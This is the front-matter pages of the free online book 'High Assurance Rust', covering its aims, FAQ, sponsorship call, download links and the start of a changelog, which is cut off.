<!DOCTYPE HTML>
<html lang="en" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>High Assurance Rust: Developing Secure and Robust Software</title>
        <meta name="robots" content="noindex">


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="highlight-css" href="highlight.css">
        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

        <!-- MathJax -->
        <script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "";
            const default_light_theme = "light";
            const default_dark_theme = "navy";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="toc.js"></script>
    </head>
    <body>
    <div id="mdbook-help-container">
        <div id="mdbook-help-popup">
            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
            <div>
                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
                <p>Press <kbd>?</kbd> to show this help</p>
                <p>Press <kbd>Esc</kbd> to hide this help</p>
            </div>
        </div>
    </div>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">High Assurance Rust: Developing Secure and Robust Software</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        <a href="https://github.com/tnballo/high-assurance-rust" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<p align="center"><img src="../img/har_logo.svg" width="65%" alt="High Assurance Rust"></p>
<style>
h1, h2, h3 {
    display: inline;
}

h1 {
  font-size: 3em;
}

h3 {
  font-size: 1.875em;
}
</style>
<div class='token'>
<center>
  <h1 id="high-assurance-rust"><a class="header" href="#high-assurance-rust">High Assurance Rust</a></h1>
  <br>
  <h3 id="developing-secure-and-robust-software"><a class="header" href="#developing-secure-and-robust-software"><i>Developing Secure and Robust Software</i></a></h3>
</center>
</div>
<hr />
<div class='token'>
<center>
<p><a href="https://github.com/tnballo/high-assurance-rust"><img src="https://img.shields.io/github/stars/tnballo/high-assurance-rust?style=social" alt="Repo" /></a>
<a href="https://github.com/tnballo/high-assurance-rust"><img src="https://img.shields.io/badge/Pages-186-purple.svg" alt="Pages" /></a>
<a href="https://github.com/tnballo/high-assurance-rust"><img src="https://img.shields.io/badge/Diagrams-54-blue.svg" alt="Diagrams" /></a>
<a href="https://highassurance.rs/cfp.html"><img src="https://img.shields.io/badge/Price-$0.00-orange.svg" alt="Price" /></a>
<a href="https://highassurance.rs/license.html"><img src="https://img.shields.io/badge/Text%20License-CC%20BY--NC--ND%204.0-yellow.svg" alt="Text License: CC BY-NC-ND 4.0" /></a>
<a href="https://highassurance.rs/license.html"><img src="https://img.shields.io/badge/Code%20License-MIT-yellowgreen.svg" alt="Code License: MIT" /></a>
<a href="https://highassurance.rs"><img src="https://img.shields.io/badge/Assurance-High-brightgreen.svg" alt="Assurance" /></a></p>
</center>
</div>
</br>
<p>This book is an introduction to building performant software we can <strong>justifiably trust</strong>.
That means having sufficient data to support confidence in our code's functionality and security.
Trustworthiness is a hallmark of <strong>high assurance</strong> software.</p>
<p>With assurance as our driving concept, we'll take a hands-on, project-based approach to two fundamental but often inaccessible topics in software development: <strong>systems programming</strong> and <strong>low-level software security</strong>.</p>
<p>You'll learn Rust - a modern, multi-paradigm language that emphasizes speed and correctness.
Most programming books teach a new language by presenting a dozen small, unrealistic programs.
Not this one.</p>
<p>We'll design, write, and validate a fully-featured alternative to the ordered map and set implementations in Rust's standard library.
You'll gain a deep understanding of the Rust language by re-implementing one of its major dynamic collections, one idiomatic API at a time.</p>
<p>Unlike the standard version, our implementation will be:</p>
<ul>
<li>
<p><strong>Maximally Safe.</strong> Upholds Rust's strongest memory safety guarantees, for all possible executions.</p>
<ul>
<li>To test properties the compiler can't prove, we'll learn advanced program analysis techniques, including <em>differential fuzzing</em> and <em>deductive verification</em>*.</li>
</ul>
</li>
<li>
<p><strong>Extremely Portable.</strong> Capable of running on every operating system, or even without one (e.g. "bare metal").</p>
<ul>
<li>Our library is a <em>hardened component</em>. To integrate it within larger codebases, we'll add <em>CFFI bindings</em> to make the Rust functions callable from other languages - including C and Python.</li>
</ul>
</li>
<li>
<p><strong>Highly Available.</strong> Offers <em>fallible</em> APIs for handling cases that could otherwise result in a crash.</p>
<ul>
<li>E.g. <em>Out-of-Memory (OOM) error</em> - when all pre-allocated memory has been exhausted.</li>
</ul>
</li>
</ul>
<h2 id="the-state-of-the-art-in-practical-software-assurance"><a class="header" href="#the-state-of-the-art-in-practical-software-assurance">The State-of-the-Art in Practical Software Assurance</a></h2>
<p>We'll use cutting-edge, open-source software assurance tools to validate the code we write in this book.
Some of these tools are mature and used in commercial industry:</p>
<ul>
<li><code>rustc</code> (modern compiler)</li>
<li><code>libFuzzer</code> (fuzz testing framework)</li>
<li><code>rr</code> ("time-travel" debugger)</li>
<li><code>qemu</code> (whole-system emulator)</li>
</ul>
<p>Other tools are experimental and under active research.
A full inventory is available in <a href="../chp16_appendix/tools.html">the appendix</a>.</p>
<p>Visually, this book covers the below topics (contrasted roughly on tradeoff of <strong>development speed</strong> and <strong>formal rigor</strong>).
Don't worry, we'll provide clear explanations and context for each.</p>
<p>Notice the bias toward development speed.
We're interested in <strong>lightweight processes</strong> that, in the long run, enable us to <strong>ship quality code faster</strong> and spend <strong>less time patching</strong> security and reliability failures.
Techniques you can apply to real-world code.
Today.</p>
</br>
<p align="center"><img src="../img/book_topics.svg" width="90%" alt="Assurance Techniques"></p>
<p>Unlike other Rust books, you won't just learn the language.
You'll learn how to <em>reason</em> about software security at the leading edge.
To think like an attacker.
And to write code resistant to attack.
That mental model is valuable no matter what programming language you primarily use.</p>
<h2 id="sponsors-supporting-this-book"><a class="header" href="#sponsors-supporting-this-book">Sponsors Supporting this Book</a></h2>
<p>The development of this book (research, writing, and coding) is made possible through the generous support of:</p>
<style>
p#sponsor {
  margin: 0 auto;
  text-align: center;
  width: 80%;
}
</style>
<p id="sponsor">
</br>
<a href="https://foundation.rust-lang.org/">
<img src="../img/rust_foundation_logo.png" width="70%" alt="The Rust Foundation">
</a>
</br>
</br>
Under the first tranche of the <a href="https://foundation.rust-lang.org/grants/">2022 Project Grants Program</a>.
A full list of awarded projects is <a href="https://foundation.rust-lang.org/news/2022-06-14-community-grants-program-awards-announcement/">available here</a>, please check out the range of exciting work happening within the global Rust community!
</br>
</br>
</p>
<blockquote>
<p><em>You need to build a data structure library to serve a mission-critical application.
It must run on nearly any device, operate in the field for years on end without error, and tolerate attacker-controlled input.
There will be no patches and there can be no failures.
Your code must survive.
<strong>Ship strong.</strong></em></p>
</blockquote>
<hr />
<blockquote>
<p>* == may be subject to change! This book is a <a href="./faq.html#8-is-this-book-free">work in progress</a>. If you'd like to be notified when it's finished and a physical print is available, please <a href="https://forms.gle/ESYgXgswCjEoCSHT9">sign up here</a>.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="frequently-asked-questions-faq"><a class="header" href="#frequently-asked-questions-faq">Frequently Asked Questions (FAQ)</a></h1>
<hr />
</br>
<p align="center">
  <img width="65%" src="./img/faq_venn.svg">
  <figure>
  <figcaption><center>Fundamental topics covered.</center></figcaption><br>
  </figure>
</p>
<h2 id="0-briefly-what-does-this-book-aim-to-do"><a class="header" href="#0-briefly-what-does-this-book-aim-to-do">0. Briefly, what does this book aim to do?</a></h2>
<ul>
<li>
<p>Provide an accessible but principled introduction to developing secure and robust systems. At the overlap of "state-of-the-art" and "near-term practical": mostly production-grade tools and techniques, but also some-cutting edge research projects. All open-source.</p>
</li>
<li>
<p>Help experienced developers both learn a new language and delve deeper into fundamental Computer Science and Computer Architecture topics.</p>
</li>
</ul>
<h2 id="1-who-is-this-book-for"><a class="header" href="#1-who-is-this-book-for">1. Who is this book for?</a></h2>
<p>Anyone interested in some combination of the above diagram:</p>
<ul>
<li>The Rust programming language</li>
<li>Software security</li>
<li>Data Structures (self-balancing trees, specifically)</li>
<li>Systems programming</li>
</ul>
<p>We do, however, assume you're already very comfortable with coding in general.
Maybe you're not a seasoned software engineer, but you've written and debugged a 3,000+ line program before.
You already understand recursion and know how to use command line tools.</p>
<p>This book also assumes you're curious about deeply technical topics.
Things like memory management and performance optimization.
The nitty-gritty of how the sausage is made.
We'll go pretty deep.</p>
<h2 id="2-so-this-is-an-advanced-book"><a class="header" href="#2-so-this-is-an-advanced-book">2. So this is an advanced book?</a></h2>
<p>We won't shy away from "advanced" subjects, like program analysis research, binary exploit development, and self-balancing trees.
Parts of this book may be challenging, but we'll strive to make every topic as accessible and engaging as possible.</p>
<p>An appendix includes short sections marked "Fundamentals".
These provide optional introductions to key concepts, to accommodate readers of different backgrounds.
If a chapter expects or recommends certain knowledge, it's covered in one of these appendix sections.</p>
<p>Moreover, a significant portion of the quoted blocks that appear in this book are specifically intended to give explanatory context for the surrounding text.
They follow this format, roughly:</p>
<blockquote>
<p><strong>Question about concept X here</strong></p>
<p>Some brief explanation of concept X and relevant keywords.
Not comprehensive, but hopefully a start in the right direction.</p>
</blockquote>
<p>The C language will occasionally be used for brief snippets, but covered as if you've never written any C yourself.
You don't need any prior Rust experience.</p>
<p>We'll provide clear explanations of any math and use diagrams to explain complex topics visually.</p>
<h2 id="3-is-this-just-another-data-structures-book"><a class="header" href="#3-is-this-just-another-data-structures-book">3. Is this just another data structures book?</a></h2>
<p>No.
Although we will be using a specific data structure (called a "scapegoat tree") to scaffold a powerful map/set library.
You'll learn through the <em>lens</em> of data structures - which combine the rigor of abstract theory with the tricks of practical implementation.
And push toward mastery of Rust's most novel concepts.</p>
<h2 id="4-what-makes-this-book-hands-on"><a class="header" href="#4-what-makes-this-book-hands-on">4. What makes this book "hands-on"?</a></h2>
<p>You'll write code, and use cutting-edge tools, throughout each chapter.</p>
<p>By the end of the first half, you'll be sending remote commands to your data structure library to test it live.
And here's the kicker: it'll be running "bare metal" inside a virtual replica of an embedded system.
We'll explain what that actually means, beyond that you don't have to buy any hardware!</p>
<p>The content of this book is derived from the implementation of a <a href="https://github.com/tnballo/scapegoat">real-world library</a>.
More importantly, you'll build an API-compatible alternative to widely-used collections in Rust's <em>standard library</em>.
This is no "toy" example.</p>
<h2 id="5-what-hacker-low-level-security-in-this-usage-skills-am-i-going-to-learn"><a class="header" href="#5-what-hacker-low-level-security-in-this-usage-skills-am-i-going-to-learn">5. What "hacker" (low-level security, in this usage) skills am I going to learn?</a></h2>
<p>You don't have to be capable of attacking a system in order to build a secure one.
But it's certainly easier if you can think like an attacker and apply some of the same tools.</p>
<p>We'll introduce a spectrum of defensive (aka "blue team") and offensive (aka "red team") skills, but emphasize the former.</p>
<ul>
<li>
<p><strong>Blue team skills (focus):</strong></p>
<ul>
<li>Secure coding in Rust</li>
<li>Lightweight formal verification</li>
<li>Safe foreign function binding</li>
</ul>
</li>
<li>
<p><strong>Red team skills (supplement):</strong></p>
<ul>
<li>The basics of modern binary exploitation</li>
<li>Reverse dynamic debugging</li>
<li>Bug finding via coverage-guided fuzzing</li>
</ul>
</li>
</ul>
<h2 id="6-can-i-apply-what-i-learn-at-work"><a class="header" href="#6-can-i-apply-what-i-learn-at-work">6. Can I apply what I learn at work?</a></h2>
<p>We'll cover C Foreign Function Interface (CFFI) binding: your APIs will be callable from both Python3 and C99 code.
That's a practical skill for integrating fast, secure Rust components into your existing work codebase.</p>
<p>Plus all of the static verification and dynamic testing tools you'll sample are free and open-source.
Some are capable of analyzing executables written in multiple languages - not just Rust.
A full tooling inventory lives <a href="../chp16_appendix/tools.html">in the appendix</a>.</p>
<p>Even if you never get a chance to run Rust in production, you'll gain systems security skills.
Those might be valuable in a range of contexts.</p>
<h2 id="7-can-i-use-rust-in-safety-critical-domains"><a class="header" href="#7-can-i-use-rust-in-safety-critical-domains">7. Can I use Rust in safety-critical domains?</a></h2>
<p>Potentially yes - depending on the domain!
Rust toolchains aren't yet as widely certified as, say, <a href="https://www.adacore.com/about-spark">SPARK/Ada</a>.
But Rust adoption in safety-critical products is making <a href="https://www.autosar.org/fileadmin/user_upload/20220308_RustWorkingGroup_Announcement_EN.pdf">active progress</a>.
Recent examples (not comprehensive):</p>
<ul>
<li>
<p>The <a href="https://github.com/ferrocene/ferrocene">Ferrocene project</a> is a downstream of the official Rust compiler that's <a href="https://ferrous-systems.com/blog/ferrocene-open-source/">"quality managed and qualified for use"</a> in automotive (currently by ISO 26262) and industrial  (currently IEC 61508) environments.</p>
</li>
<li>
<p>Hardware vendors, like <a href="https://www.infineon.com/cms/en/product/promopages/rust/">Infineon Technologies</a>, are similarly beginning to offer Rust toolchains targeting their platforms.</p>
</li>
<li>
<p>Software vendors, like <a href="https://www.adacore.com/gnatpro-rust">AdaCore</a>, now offer safety-critical specific Rust tooling.</p>
</li>
</ul>
<p>This book is about building secure and robust software in general, regardless of industry.
As the regulatory landscape for Rust evolves, you'll be able to apply our topics in more verticals.</p>
<p>For most industries, Rust is production-ready.
Today.
The language is currently used in many <em>mission-critical</em> settings.
Including web-scale infrastructure, financial services, and consumer products.</p>
<blockquote>
<p><strong>Disclaimer:</strong> An author of this book is also a volunteer on an SAE International task force currently creating guidelines for Rust usage in safety-critical systems.</p>
</blockquote>
<h2 id="8-is-this-book-free"><a class="header" href="#8-is-this-book-free">8. Is this book free?</a></h2>
<p>Absolutely!
No paywalls, no obligations, no gate keeping.
The entire book is publicly available at <a href="https://highassurance.rs">https://highassurance.rs</a>.</p>
<p>But it's still a <strong>work in progress</strong>.
The long-term goal is to provide <em>everyone</em> in the community with a <em>high-quality</em> resource on fundamental topics.
Building a well-rounded book will take time and iteration (your <a href="./engage.html#submit-feedback-questions-issues-or-prs">feedback is appreciated</a>).</p>
<p>If you find this book valuable, you can support this project via:</p>
<ul>
<li>
<p><strong>Starring the book's GitHub repo:</strong> It's <a href="https://github.com/tnballo/high-assurance-rust">here</a>. Starring helps increase the visibility of this project among developers.</p>
</li>
<li>
<p><strong>Buying one of the other books referenced throughout:</strong>
Footnotes are used to cite sources.
When that source is a technical textbook we love and cherish, the footnote includes an Amazon affiliate link differentiated by the tag <strong>[PERSONAL FAVORITE]</strong>.
These links are used sparingly, only for books we genuinely feel are essential reads.
A full list is <a href="../chp16_appendix/books.html">in the appendix</a>.
If you purchase one using the link, it supports both this book and, obviously, the one you're buying.</p>
</li>
<li>
<p><strong>Signing up for the physical copy wait list:</strong>
At some point in the future, <em>High Assurance Rust</em> will be finished, polished, and worthy of a physical print.
If you're interested in a hardcopy, please <a href="https://forms.gle/ESYgXgswCjEoCSHT9">sign up here</a> to be notified.</p>
</li>
</ul>
<blockquote>
<p>Are you a <strong>leading security startup or enterprise</strong> that believes in continuing education?
Would you like to feature your logo on this book's landing page to reach current or aspiring developers?
If so, please see the <a href="./cfp.html">Sponsor Call for Proposals (CFP)</a> page.</p>
</blockquote>
<h2 id="9-anything-else-i-should-know"><a class="header" href="#9-anything-else-i-should-know">9. Anything else I should know?</a></h2>
<p>A great deal of effort went into making this book a reality.
We hope you have as much fun reading as we did writing.
Let's hack together!</p>
<br>
<hr />
<blockquote>
<p>* == may be subject to change, it's not written yet! This book is a <a href="./faq.html#8-is-this-book-free">work in progress</a>.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="engage-with-this-book"><a class="header" href="#engage-with-this-book">Engage with this Book!</a></h1>
<hr />
<h2 id="submit-feedback-questions-issues-or-prs"><a class="header" href="#submit-feedback-questions-issues-or-prs">Submit Feedback, Questions, Issues, or PRs</a></h2>
<p>Have general feedback?
Or maybe a burning question?</p>
<p>This book is a work-in-progress and your input matters.
We'd love to hear from you, please send an email to:</p>
<p><a href="mailto:contact@highassurance.rs"><strong>contact@highassurance.rs</strong></a></p>
<p>Spotted a factual or grammatical error?</p>
<p>Please submit an Issue or Pull Request (PR) on GitHub.
See the project's <a href="https://github.com/tnballo/high-assurance-rust/blob/main/CONTRIBUTING.md"><code>CONTRIBUTING.md</code></a>.</p>
<h2 id="star-the-repos"><a class="header" href="#star-the-repos">Star the Repos</a></h2>
<p>You can help increase the visibility of this project among developers by starring its GitHub repos.
We greatly appreciate your support.</p>
<p><strong>This Book:</strong></p>
<iframe src="https://ghbtns.com/github-btn.html?user=tnballo&repo=high-assurance-rust&type=star&count=true&size=large" frameborder="0" scrolling="0" width="170" height="30" title="GitHub"></iframe>
<p><strong><code>scapegoat</code> Crate:</strong></p>
<iframe src="https://ghbtns.com/github-btn.html?user=tnballo&repo=scapegoat&type=star&count=true&size=large" frameborder="0" scrolling="0" width="170" height="30" title="GitHub"></iframe>
<h2 id="recommend-to-a-friend"><a class="header" href="#recommend-to-a-friend">Recommend to a Friend</a></h2>
<p>Consider shooting a link to a friend, they can read the whole book for free!</p>
<p>Clicking on a subheading within a chapter will display a targeted URL in your browser's address bar.</p>
<h2 id="cite-high-assurance-rust"><a class="header" href="#cite-high-assurance-rust">Cite <em>High Assurance Rust</em></a></h2>
<p>Though this book is designed with accessibility in mind, we'll delve into advanced topics and contextualize relevant research.
Bottom-of-page footnotes cite primary sources.</p>
<p>If you'd like to cite this book directly in your own work, please use this BibTeX or similar:</p>
<pre><code class="language-ignore">@misc{high_assurance_rust,
    title={High Assurance Rust: Developing Secure and Robust Software},
    url={https://highassurance.rs},
    howpublished = "\url{https://highassurance.rs}",
    author={Ballo, Tiemoko and Ballo, Moumine and James, Alex},
    year={2022}
}
</code></pre>
<h2 id="other-ways-to-support-this-project"><a class="header" href="#other-ways-to-support-this-project">Other Ways to Support this Project</a></h2>
<p>Please see the <a href="./faq.html#8-is-this-book-free">FAQ's question #8, here</a>.</p>
<p>Thanks in advance!</p>
<hr />
<div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="sponsor-call-for-proposals-cfp"><a class="header" href="#sponsor-call-for-proposals-cfp">Sponsor Call for Proposals (CFP)</a></h1>
<hr />
<p>Readers of this book are likely interested in <strong>software careers</strong> and/or <strong>security products</strong>.
This is a <strong>discovery problem</strong> with two stakeholders:</p>
<ol>
<li>
<p><strong>Engineers</strong> looking for exciting teams to join.</p>
</li>
<li>
<p><strong>Companies</strong> looking to get quality tools in the hands of security-savvy engineers.</p>
</li>
</ol>
<p>The primary goal of this book is <strong>free education</strong>.
But we'd also love to connect those stakeholders - should both parties stand to benefit.</p>
<h2 id="what-we-are-asking"><a class="header" href="#what-we-are-asking">What we are asking</a></h2>
<ul>
<li>
<p>That your company meet <strong>two criteria</strong>:</p>
<ol>
<li>
<p>Employer with technical roles (software development, security engineering, technical writing, product management, etc)</p>
</li>
<li>
<p>Offers a security-relevant product (SaaS, hardware, reports, etc) or professional service (consulting, training, R&amp;D, etc)</p>
</li>
</ol>
</li>
<li>
<p><strong>A one-time donation</strong> to sponsor the development of this book.</p>
<ul>
<li>
<p>Likely a tiny sum relative to your current marketing budget.</p>
</li>
<li>
<p>You'd be supporting a freely available resource for continuing education.</p>
</li>
</ul>
</li>
<li>
<p>A <strong>brief proposal</strong> for a written section.</p>
<ul>
<li>See below.</li>
</ul>
</li>
</ul>
<h2 id="what-we-can-offer"><a class="header" href="#what-we-can-offer">What we can offer</a></h2>
<ul>
<li>
<p>Your <strong>logo listed as a sponsor</strong> on the landing page of this book, with two links of your choosing (your careers page, your product page, etc).</p>
<ul>
<li>
<p>Logos will appear in order of sponsorship start date (first to latest).</p>
</li>
<li>
<p>Logo placement for the lifetime of this domain (guaranteed 10+ years).</p>
</li>
<li>
<p>You can request removal of your logo/links at any time, for any reason (e.g. future chapter of the book doesn't meet your values or quality standards).</p>
</li>
</ul>
</li>
<li>
<p>A <strong>written section</strong> in a dedicated sponsor chapter at the end of the book.</p>
<ul>
<li>
<p>Tutorial of product use, article on team culture, etc.</p>
</li>
<li>
<p>Up to 3,500 words, written by you (the experts on the topic).</p>
</li>
<li>
<p><strong>No tracking/analytics allowed</strong> (respect reader privacy, like an old-school magazine ad). No reader information can be collected or shared.</p>
<ul>
<li>The star count on this book's repos already serves as a <em>transparent</em> and <em>voluntary</em> metric of visibility.</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>If you'd like to become a sponsor, please send your brief proposal (plaintext or PDF preferred) to:</p>
<p><a href="mailto:contact@highassurance.rs?subject=Sponsorship_Proposal"><strong>contact@highassurance.rs</strong></a></p>
<p>We'd love to hear from you!</p>
<blockquote>
<p>We reserve the right to politely decline sponsorship requests for any reason (e.g. brand reputation, proposal topic, etc). We must do right by our readers.</p>
</blockquote>
<hr />
<div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="download"><a class="header" href="#download">Download</a></h1>
<hr />
<p>Viewing this book as a webpage is recommended.
For offline viewing, you can clone <a href="https://github.com/tnballo/high-assurance-rust">the repo</a> to get a full local copy (<code>make read</code> to serve locally).
Alternatively:</p>
<ul>
<li>
<p><a href="https://tiemoko.com/publications/har.epub">EPUB</a></p>
<ul>
<li>Last export: 10/8/23</li>
<li>SHA-3-256: <code>23e158a622087b88c906b269c8a0523ae81d17b2e01a89ccb4ea81e4342c5e2e</code></li>
</ul>
</li>
<li>
<p>PDF (coming one day)</p>
</li>
</ul>
<p>Hashes can be verified with: <code>openssl dgst -sha3-256 &lt;file_name&gt;</code>.</p>
<p>Enjoy!</p>
<div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="changelog"><a class="header" href="#changelog">Changelog</a></h1>
<hr />
<p><strong>Note:</strong> This book is a work in progress, and its contents (current or future) are subject to change.
If you've found an error, please <a href="./engage.html#submit-feedback-questions-issues-or-prs">get in touch</a>.</p>
<ul>
<li>
